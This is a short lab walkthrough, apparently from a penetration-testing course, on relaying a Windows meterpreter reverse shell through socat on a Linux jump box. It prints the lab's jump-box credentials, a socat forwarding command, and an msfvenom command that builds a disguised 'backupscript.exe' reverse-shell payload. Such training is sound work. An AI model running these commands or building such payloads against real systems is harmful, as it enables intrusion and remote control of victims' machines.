## Socat Redirection with a Reverse Shell

[Socat](https://linux.die.net/man/1/socat) is a bidirectional relay tool that can create pipe sockets between **2** independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. We can start Metasploit's listener using the same command mentioned in the last section on our attack host, and we can start **socat** on the Ubuntu server. 


#### Jump box credentials 10.129.188.148 (ACADEMY-PIVOTING-LINUXPIV)

Username: ubuntu
Password: HTB_@cademy_stdnt!


### Starting Socat Listener


Socat will listen on localhost on port **4444** and forward all the traffic to port **8000** on our attack host (10.10.14.18). Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server. We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host's listener, where we would be getting a shell.

	$ socat TCP4-LISTEN:4444,FORK TCP4:10.10.15.168:8000


![Socat Lister](/Socat-reverse-shell/socat-reverse-shell.png) 


### Creating the Windows Payload

	$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.5.129 lport=4444 -f exe -o backupscript.exe

Keep in mind that we must transfer this payload to the Windows host. We can use some of the same techniques used in previous sections to do so.


### Configuring and Starting multi / handler


![Multi Handler](/Socat-reverse-shell/multi-handler.png) 


We can test this by running our payload on the windows host again, and we should see a network connection from the Ubuntu server this time.


### Establishing the Meterpreter Session


![Root](/Socat-reverse-shell/root.png) 
